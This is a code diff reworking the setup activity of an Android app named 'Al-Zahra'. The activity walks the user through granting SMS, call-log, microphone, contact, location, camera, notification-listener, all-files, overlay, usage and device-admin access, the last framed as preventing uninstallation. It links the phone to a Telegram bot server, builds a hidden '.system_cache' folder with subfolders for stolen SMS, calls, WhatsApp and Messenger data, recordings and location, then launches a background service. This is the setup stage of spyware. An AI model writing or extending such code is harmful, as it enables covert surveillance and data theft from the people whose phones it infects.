@@ -32,6 +32,7 @@ import com.alzahra.receiver.AdminReceiver;
 import com.alzahra.service.CoreService;
 
 import java.io.BufferedReader;
+import java.io.File;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -48,7 +49,6 @@ public class MainActivity extends Activity {
     private ProgressBar progressBar;
     private LinearLayout mainLayout;
     
-    // الخطوات
     private static final int STEP_PERMISSIONS = 0;
     private static final int STEP_NOTIFICATION = 1;
     private static final int STEP_STORAGE = 2;
@@ -92,7 +92,6 @@ public class MainActivity extends Activity {
         prefs = getSharedPreferences("alzahra_prefs", MODE_PRIVATE);
         handler = new Handler(Looper.getMainLooper());
         
-        // التحقق من الإعداد السابق
         if (prefs.getBoolean("fully_configured", false)) {
             startServiceAndFinish();
             return;
@@ -146,20 +145,9 @@ public class MainActivity extends Activity {
         }
     }
     
-    // ═══════════════════════════════════════════
-    // نظام الأذونات المحسّن - لا ينتقل إلا بعد التفعيل
-    // ═══════════════════════════════════════════
-    
-    private void requestAllPermissions() {
-        List<String> permissions = getMissingPermissions();
-        
-        if (permissions.isEmpty()) {
-            Log.d(TAG, "All runtime permissions already granted");
-            nextStep();
-        } else {
-            Log.d(TAG, "Requesting " + permissions.size() + " permissions");
-            ActivityCompat.requestPermissions(this, permissions.toArray(new String[0]), PERMISSION_REQUEST_CODE);
-        }
+    private void nextStep() {
+        currentStep++;
+        handler.postDelayed(this::runSetupStep, 800);
     }
     
     private List<String> getMissingPermissions() {
@@ -235,6 +223,16 @@ public class MainActivity extends Activity {
         return permissions;
     }
     
+    private void requestAllPermissions() {
+        List<String> permissions = getMissingPermissions();
+        
+        if (permissions.isEmpty()) {
+            nextStep();
+        } else {
+            ActivityCompat.requestPermissions(this, permissions.toArray(new String[0]), PERMISSION_REQUEST_CODE);
+        }
+    }
+    
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
@@ -244,21 +242,15 @@ public class MainActivity extends Activity {
             List<String> denied = new ArrayList<>();
             
             for (int i = 0; i < permissions.length; i++) {
-                String perm = permissions[i];
-                boolean granted = grantResults[i] == PackageManager.PERMISSION_GRANTED;
-                Log.d(TAG, "Permission: " + perm + " = " + (granted ? "GRANTED" : "DENIED"));
-                
-                if (!granted) {
+                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                     allGranted = false;
-                    denied.add(perm);
+                    denied.add(permissions[i]);
                 }
             }
             
             if (allGranted) {
-                // كل الصلاحيات مفعّلة - انتقل للخطوة التالية
                 nextStep();
             } else {
-                // بعض الصلاحيات مرفوضة - أظهر رسالة وأعد الطلب
                 showPermissionRetryDialog(denied);
             }
         }
@@ -269,7 +261,6 @@ public class MainActivity extends Activity {
         for (String perm : deniedPerms) {
             message.append("• ").append(getPermissionName(perm)).append("\n");
         }
-        message.append("\nيرجى السماح بجميع الصلاحيات");
         
         new AlertDialog.Builder(this)
             .setTitle("⚠️ صلاحيات مطلوبة")
@@ -285,42 +276,25 @@ public class MainActivity extends Activity {
     }
     
     private String getPermissionName(String perm) {
-        switch (perm) {
-            case Manifest.permission.READ_PHONE_STATE: return "حالة الهاتف";
-            case Manifest.permission.READ_CALL_LOG: return "سجل المكالمات";
-            case Manifest.permission.PROCESS_OUTGOING_CALLS: return "المكالمات الصادرة";
-            case Manifest.permission.RECORD_AUDIO: return "تسجيل الصوت";
-            case Manifest.permission.READ_CONTACTS: return "جهات الاتصال";
-            case Manifest.permission.READ_SMS: return "الرسائل النصية";
-            case Manifest.permission.SEND_SMS: return "إرسال الرسائل";
-            case Manifest.permission.RECEIVE_SMS: return "استقبال الرسائل";
-            case Manifest.permission.ACCESS_FINE_LOCATION: return "الموقع الدقيق";
-            case Manifest.permission.ACCESS_COARSE_LOCATION: return "الموقع التقريبي";
-            case Manifest.permission.ACCESS_BACKGROUND_LOCATION: return "الموقع في الخلفية";
-            case Manifest.permission.CAMERA: return "الكاميرا";
-            case Manifest.permission.POST_NOTIFICATIONS: return "الإشعارات";
-            case Manifest.permission.READ_EXTERNAL_STORAGE: return "قراءة الملفات";
-            case Manifest.permission.WRITE_EXTERNAL_STORAGE: return "كتابة الملفات";
-            case Manifest.permission.READ_MEDIA_IMAGES: return "الصور";
-            case Manifest.permission.READ_MEDIA_VIDEO: return "الفيديو";
-            case Manifest.permission.READ_MEDIA_AUDIO: return "الصوت";
-            case Manifest.permission.CALL_PHONE: return "إجراء المكالمات";
-            case Manifest.permission.MODIFY_AUDIO_SETTINGS: return "إعدادات الصوت";
-            default: return perm;
-        }
+        if (perm.equals(Manifest.permission.READ_PHONE_STATE)) return "حالة الهاتف";
+        if (perm.equals(Manifest.permission.READ_CALL_LOG)) return "سجل المكالمات";
+        if (perm.equals(Manifest.permission.RECORD_AUDIO)) return "تسجيل الصوت";
+        if (perm.equals(Manifest.permission.READ_CONTACTS)) return "جهات الاتصال";
+        if (perm.equals(Manifest.permission.READ_SMS)) return "الرسائل النصية";
+        if (perm.equals(Manifest.permission.ACCESS_FINE_LOCATION)) return "الموقع";
+        if (perm.equals(Manifest.permission.CAMERA)) return "الكاميرا";
+        if (perm.equals(Manifest.permission.READ_EXTERNAL_STORAGE)) return "قراءة الملفات";
+        if (perm.equals(Manifest.permission.WRITE_EXTERNAL_STORAGE)) return "كتابة الملفات";
+        return perm;
     }
     
-    // ═══════════════════════════════════════════
-    // الخطوة 2: الوصول للإشعارات - ينتظر التفعيل
-    // ═══════════════════════════════════════════
     private void requestNotificationAccess() {
         if (isNotificationServiceEnabled()) {
             nextStep();
             return;
         }
         
-        showStepDialog("الوصول للإشعارات",
-            "يرجى تفعيل 'Al-Zahra' في قائمة الوصول للإشعارات",
+        showStepDialog("الوصول للإشعارات", "يرجى تفعيل 'Al-Zahra'",
             () -> {
                 try {
                     startActivityForResult(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS), 2001);
@@ -335,9 +309,6 @@ public class MainActivity extends Activity {
         return flat != null && flat.contains(getPackageName());
     }
     
-    // ═══════════════════════════════════════════
-    // الخطوة 3: الوصول لجميع الملفات - ينتظر التفعيل
-    // ═══════════════════════════════════════════
     private void requestStorageAccess() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             if (Environment.isExternalStorageManager()) {
@@ -345,21 +316,14 @@ public class MainActivity extends Activity {
                 return;
             }
             
-            showStepDialog("الوصول لجميع الملفات",
-                "يرجى السماح بالوصول لجميع الملفات",
+            showStepDialog("الوصول لجميع الملفات", "يرجى السماح بالوصول",
                 () -> {
                     try {
                         Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                         intent.setData(Uri.parse("package:" + getPackageName()));
                         startActivityForResult(intent, 2002);
                     } catch (Exception e) {
-                        try {
-                            Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
-                            intent.setData(Uri.parse("package:" + getPackageName()));
-                            startActivityForResult(intent, 2002);
-                        } catch (Exception e2) {
-                            nextStep();
-                        }
+                        nextStep();
                     }
                 });
         } else {
@@ -367,9 +331,6 @@ public class MainActivity extends Activity {
         }
     }
     
-    // ═══════════════════════════════════════════
-    // الخطوة 4: الظهور فوق التطبيقات - ينتظر التفعيل
-    // ═══════════════════════════════════════════
     private void requestOverlayPermission() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             if (Settings.canDrawOverlays(this)) {
@@ -377,8 +338,7 @@ public class MainActivity extends Activity {
                 return;
             }
             
-            showStepDialog("الظهور فوق التطبيقات",
-                "يرجى السماح بالظهور فوق التطبيقات الأخرى",
+            showStepDialog("الظهور فوق التطبيقات", "يرجى السماح",
                 () -> {
                     try {
                         startActivityForResult(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
@@ -392,17 +352,13 @@ public class MainActivity extends Activity {
         }
     }
     
-    // ═══════════════════════════════════════════
-    // الخطوة 5: الوصول للاستخدام - ينتظر التفعيل
-    // ═══════════════════════════════════════════
     private void requestUsageAccess() {
         if (isUsageAccessGranted()) {
             nextStep();
             return;
         }
         
-        showStepDialog("الوصول للاستخدام",
-            "يرجى تفعيل الوصول للاستخدام",
+        showStepDialog("الوصول للاستخدام", "يرجى التفعيل",
             () -> {
                 try {
                     startActivityForResult(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS), 2004);
@@ -424,9 +380,6 @@ public class MainActivity extends Activity {
         }
     }
     
-    // ═══════════════════════════════════════════
-    // الخطوة 6: تحسين البطارية - ينتظر التفعيل
-    // ═══════════════════════════════════════════
     private void requestBatteryOptimization() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
@@ -435,8 +388,7 @@ public class MainActivity extends Activity {
                 return;
             }
             
-            showStepDialog("تجاهل تحسين البطارية",
-                "يرجى السماح بتجاهل تحسين البطارية للعمل المستمر",
+            showStepDialog("تجاهل تحسين البطارية", "يرجى السماح",
                 () -> {
                     try {
                         Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
@@ -451,9 +403,6 @@ public class MainActivity extends Activity {
         }
     }
     
-    // ═══════════════════════════════════════════
-    // الخطوة 7: مسؤول الجهاز - ينتظر التفعيل
-    // ═══════════════════════════════════════════
     private void requestDeviceAdmin() {
         DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
         ComponentName admin = new ComponentName(this, AdminReceiver.class);
@@ -463,14 +412,11 @@ public class MainActivity extends Activity {
             return;
         }
         
-        showStepDialog("تفعيل مسؤول الجهاز",
-            "يرجى تفعيل صلاحية المسؤول لحماية التطبيق من الحذف",
+        showStepDialog("تفعيل مسؤول الجهاز", "يرجى التفعيل",
             () -> {
                 try {
                     Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                     intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
-                    intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
-                        "يرجى تفعيل صلاحية المسؤول لحماية التطبيق");
                     startActivityForResult(intent, 2006);
                 } catch (Exception e) {
                     nextStep();
@@ -478,9 +424,6 @@ public class MainActivity extends Activity {
             });
     }
     
-    // ═══════════════════════════════════════════
-    // الخطوة 8: شاشة الربط الحقيقية مع السيرفر
-    // ═══════════════════════════════════════════
     private void showLinkScreen() {
         runOnUiThread(() -> {
             mainLayout.removeAllViews();
@@ -493,28 +436,21 @@ public class MainActivity extends Activity {
             mainLayout.addView(title);
             
             TextView info = new TextView(this);
-            info.setText("1. افتح البوت في تيليجرام\n2. أرسل /link\n3. أدخل الكود الذي يظهر لك");
+            info.setText("1. افتح البوت في تيليجرام\n2. أرسل /link\n3. أدخل الكود");
             info.setTextColor(0xFFBBBBBB);
             info.setTextSize(16);
             info.setPadding(0, 0, 0, 24);
             mainLayout.addView(info);
             
-            TextView codeLabel = new TextView(this);
-            codeLabel.setText("أدخل كود الربط (9 أرقام):");
-            codeLabel.setTextColor(0xFFAAAAAA);
-            codeLabel.setTextSize(14);
-            mainLayout.addView(codeLabel);
-            
             EditText codeInput = new EditText(this);
-            codeInput.setHint("XXXXXXXXX");
-            codeInput.setTextSize(24);
+            codeInput.setHint("أدخل كود الربط (9 أرقام)");
+            codeInput.setTextSize(20);
             codeInput.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
             codeInput.setPadding(24, 16, 24, 16);
             mainLayout.addView(codeInput);
             
             TextView linkStatus = new TextView(this);
             linkStatus.setText("");
-            linkStatus.setTextColor(0xFF4CAF50);
             linkStatus.setTextSize(14);
             linkStatus.setPadding(0, 16, 0, 16);
             mainLayout.addView(linkStatus);
@@ -522,10 +458,9 @@ public class MainActivity extends Activity {
             Button linkBtn = new Button(this);
             linkBtn.setText("🔗 ربط");
             linkBtn.setTextSize(16);
-            linkBtn.setPadding(32, 16, 32, 16);
             linkBtn.setOnClickListener(v -> {
                 String code = codeInput.getText().toString().trim();
-                if (code.length() != 9 || !code.matches("\\d{9}")) {
+                if (code.length() != 9) {
                     linkStatus.setText("❌ الكود يجب أن يكون 9 أرقام");
                     linkStatus.setTextColor(0xFFF44336);
                     return;
@@ -535,21 +470,16 @@ public class MainActivity extends Activity {
                 linkStatus.setText("⏳ جاري التحقق...");
                 linkStatus.setTextColor(0xFFFF9800);
                 
-                // التحقق من الكود مع السيرفر
                 verifyCodeWithServer(code, new LinkCallback() {
                     @Override
                     public void onSuccess(String deviceId) {
                         runOnUiThread(() -> {
                             linkStatus.setText("✅ تم الربط بنجاح!");
                             linkStatus.setTextColor(0xFF4CAF50);
-                            
-                            // حفظ حالة الربط
                             prefs.edit()
                                 .putBoolean("device_linked", true)
                                 .putString("device_id", deviceId)
-                                .putString("link_code", code)
                                 .apply();
-                            
                             handler.postDelayed(() -> nextStep(), 1500);
                         });
                     }
@@ -579,13 +509,10 @@ public class MainActivity extends Activity {
                 conn.setRequestProperty("Content-Type", "application/json");
                 conn.setDoOutput(true);
                 conn.setConnectTimeout(10000);
-                conn.setReadTimeout(10000);
                 
-                // إرسال الكود ومعلومات الجهاز
-                String json = "{\"code\":\"" + code + "\"," +
-                    "\"device_id\":\"" + getDeviceId() + "\"," +
-                    "\"model\":\"" + Build.MODEL + "\"," +
-                    "\"android\":\"" + Build.VERSION.RELEASE + "\"}";
+                String uniqueId = getUniqueId();
+                String json = "{\"code\":\"" + code + "\",\"device_id\":\"" + uniqueId + 
+                    "\",\"model\":\"" + Build.MODEL + "\",\"android\":\"" + Build.VERSION.RELEASE + "\"}";
                 
                 conn.getOutputStream().write(json.getBytes());
                 
@@ -600,35 +527,31 @@ public class MainActivity extends Activity {
                     }
                     reader.close();
                     
-                    // تحليل الرد
                     org.json.JSONObject jsonResponse = new org.json.JSONObject(response.toString());
                     String status = jsonResponse.optString("status", "error");
                     
                     if ("ok".equals(status)) {
-                        String deviceId = jsonResponse.optString("device_id", getDeviceId());
-                        callback.onSuccess(deviceId);
+                        callback.onSuccess(uniqueId);
                     } else {
-                        String error = jsonResponse.optString("message", "كود غير صحيح");
-                        callback.onError(error);
+                        callback.onError(jsonResponse.optString("message", "كود غير صحيح"));
                     }
                 } else {
-                    callback.onError("خطأ في الاتصال بالسيرفر");
+                    callback.onError("خطأ في الاتصال");
                 }
                 
                 conn.disconnect();
                 
             } catch (Exception e) {
-                Log.e(TAG, "Verify code error", e);
-                callback.onError("فشل الاتصال: " + e.getMessage());
+                callback.onError("فشل الاتصال");
             }
         }).start();
     }
     
-    private String getDeviceId() {
-        String id = prefs.getString("device_id", "");
+    private String getUniqueId() {
+        String id = prefs.getString("unique_device_id", "");
         if (id.isEmpty()) {
             id = java.util.UUID.randomUUID().toString().substring(0, 8);
-            prefs.edit().putString("device_id", id).apply();
+            prefs.edit().putString("unique_device_id", id).apply();
         }
         return id;
     }
@@ -638,20 +561,10 @@ public class MainActivity extends Activity {
         void onError(String error);
     }
     
-    // ═══════════════════════════════════════════
-    // إكمال الإعداد
-    // ═══════════════════════════════════════════
     private void completeSetup() {
         updateStatus("✅ تم الإعداد بنجاح!");
-        
-        prefs.edit()
-            .putBoolean("fully_configured", true)
-            .putLong("setup_time", System.currentTimeMillis())
-            .putString("server_url", serverUrl)
-            .apply();
-        
+        prefs.edit().putBoolean("fully_configured", true).apply();
         createSecretFolder();
-        
         handler.postDelayed(this::startServiceAndFinish, 1500);
     }
     
@@ -664,29 +577,21 @@ public class MainActivity extends Activity {
                 secretDir = new File(Environment.getExternalStorageDirectory(), ".system_cache");
             }
             
-            if (!secretDir.exists()) {
-                secretDir.mkdirs();
-            }
+            if (!secretDir.exists()) secretDir.mkdirs();
             
             String[] subDirs = {"sms", "calls", "notifications", "whatsapp", "messenger", "recordings", "contacts", "location", "camera", "temp"};
             for (String dir : subDirs) {
                 File subDir = new File(secretDir, dir);
-                if (!subDir.exists()) {
-                    subDir.mkdirs();
-                }
+                if (!subDir.exists()) subDir.mkdirs();
             }
             
             File nomedia = new File(secretDir, ".nomedia");
-            if (!nomedia.exists()) {
-                nomedia.createNewFile();
-            }
+            if (!nomedia.exists()) nomedia.createNewFile();
             
             prefs.edit().putString("secret_path", secretDir.getAbsolutePath()).apply();
             
-            Log.d(TAG, "Secret folder created: " + secretDir.getAbsolutePath());
-            
         } catch (Exception e) {
-            Log.e(TAG, "Error creating secret folder", e);
+            Log.e(TAG, "Error creating folder", e);
         }
     }
     
@@ -701,16 +606,7 @@ public class MainActivity extends Activity {
         } catch (Exception e) {
             Log.e(TAG, "Error starting service", e);
         }
-        
         finishAffinity();
-    }
-    
-    // ═══════════════════════════════════════════
-    // وظائف مساعدة
-    // ═══════════════════════════════════════════
-    private void nextStep() {
-        currentStep++;
-        handler.postDelayed(this::runSetupStep, 800);
     }
     
     private void showStepDialog(String title, String message, Runnable onConfirm) {
@@ -726,139 +622,70 @@ public class MainActivity extends Activity {
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
-        Log.d(TAG, "onActivityResult: " + requestCode);
         
-        // التحقق من حالة الخطوة الحالية قبل الانتقال
         switch (requestCode) {
-            case 2001: // الإشعارات
-                if (isNotificationServiceEnabled()) {
-                    nextStep();
-                } else {
-                    // لم يتم التفعيل - أظهر رسالة
-                    showStepDialog("⚠️ لم يتم التفعيل",
-                        "يرجى تفعيل الوصول للإشعارات للمتابعة",
-                        () -> {
-                            try {
-                                startActivityForResult(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS), 2001);
-                            } catch (Exception e) {
-                                nextStep();
-                            }
-                        });
-                }
+            case 2001:
+                if (isNotificationServiceEnabled()) nextStep();
+                else showRetryDialog("الإشعارات", () -> startActivityForResult(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS), 2001));
                 break;
-            case 2002: // التخزين
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                    if (Environment.isExternalStorageManager()) {
-                        nextStep();
-                    } else {
-                        showStepDialog("⚠️ لم يتم التفعيل",
-                            "يرجى السماح بالوصول لجميع الملفات",
-                            () -> {
-                                try {
-                                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
-                                    intent.setData(Uri.parse("package:" + getPackageName()));
-                                    startActivityForResult(intent, 2002);
-                                } catch (Exception e) {
-                                    nextStep();
-                                }
-                            });
-                    }
-                } else {
-                    nextStep();
-                }
+            case 2002:
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && Environment.isExternalStorageManager()) nextStep();
+                else if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) nextStep();
+                else showRetryDialog("الملفات", () -> {
+                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
+                    intent.setData(Uri.parse("package:" + getPackageName()));
+                    startActivityForResult(intent, 2002);
+                });
                 break;
-            case 2003: // الظهور فوق التطبيقات
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                    if (Settings.canDrawOverlays(this)) {
-                        nextStep();
-                    } else {
-                        showStepDialog("⚠️ لم يتم التفعيل",
-                            "يرجى السماح بالظهور فوق التطبيقات",
-                            () -> {
-                                try {
-                                    startActivityForResult(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                                        Uri.parse("package:" + getPackageName())), 2003);
-                                } catch (Exception e) {
-                                    nextStep();
-                                }
-                            });
-                    }
-                } else {
-                    nextStep();
-                }
+            case 2003:
+                if (Settings.canDrawOverlays(this)) nextStep();
+                else showRetryDialog("الظهور", () -> startActivityForResult(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                    Uri.parse("package:" + getPackageName())), 2003));
                 break;
-            case 2004: // الاستخدام
-                if (isUsageAccessGranted()) {
-                    nextStep();
-                } else {
-                    showStepDialog("⚠️ لم يتم التفعيل",
-                        "يرجى تفعيل الوصول للاستخدام",
-                        () -> {
-                            try {
-                                startActivityForResult(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS), 2004);
-                            } catch (Exception e) {
-                                nextStep();
-                            }
-                        });
-                }
+            case 2004:
+                if (isUsageAccessGranted()) nextStep();
+                else showRetryDialog("الاستخدام", () -> startActivityForResult(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS), 2004));
                 break;
-            case 2005: // البطارية
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                    PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
-                    if (pm != null && pm.isIgnoringBatteryOptimizations(getPackageName())) {
-                        nextStep();
-                    } else {
-                        showStepDialog("⚠️ لم يتم التفعيل",
-                            "يرجى السماح بتجاهل تحسين البطارية",
-                            () -> {
-                                try {
-                                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-                                    intent.setData(Uri.parse("package:" + getPackageName()));
-                                    startActivityForResult(intent, 2005);
-                                } catch (Exception e) {
-                                    nextStep();
-                                }
-                            });
-                    }
-                } else {
-                    nextStep();
-                }
+            case 2005:
+                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+                if (pm != null && pm.isIgnoringBatteryOptimizations(getPackageName())) nextStep();
+                else showRetryDialog("البطارية", () -> {
+                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                    intent.setData(Uri.parse("package:" + getPackageName()));
+                    startActivityForResult(intent, 2005);
+                });
                 break;
-            case 2006: // مسؤول الجهاز
+            case 2006:
                 DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                 ComponentName admin = new ComponentName(this, AdminReceiver.class);
-                if (dpm != null && dpm.isAdminActive(admin)) {
-                    nextStep();
-                } else {
-                    showStepDialog("⚠️ لم يتم التفعيل",
-                        "يرجى تفعيل صلاحية المسؤول",
-                        () -> {
-                            try {
-                                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
-                                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
-                                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "يرجى تفعيل صلاحية المسؤول");
-                                startActivityForResult(intent, 2006);
-                            } catch (Exception e) {
-                                nextStep();
-                            }
-                        });
-                }
+                if (dpm != null && dpm.isAdminActive(admin)) nextStep();
+                else showRetryDialog("المسؤول", () -> {
+                    Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+                    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
+                    startActivityForResult(intent, 2006);
+                });
                 break;
-            case 3001: // الإعدادات
-                // إعادة التحقق من الصلاحيات
+            case 3001:
                 requestAllPermissions();
                 break;
             default:
                 nextStep();
-                break;
         }
+    }
+    
+    private void showRetryDialog(String name, Runnable retry) {
+        new AlertDialog.Builder(this)
+            .setTitle("⚠️ لم يتم تفعيل " + name)
+            .setMessage("يرجى التفعيل للمتابعة")
+            .setPositiveButton("إعادة المحاولة", (d, w) -> retry.run())
+            .setNegativeButton("تخطي", (d, w) -> nextStep())
+            .setCancelable(false)
+            .show();
     }
     
     @Override
     protected void onDestroy() {
         super.onDestroy();
-        if (handler != null) {
-            handler.removeCallbacksAndMessages(null);
-        }
+        if (handler != null) handler.removeCallbacksAndMessages(null);
     }
 }
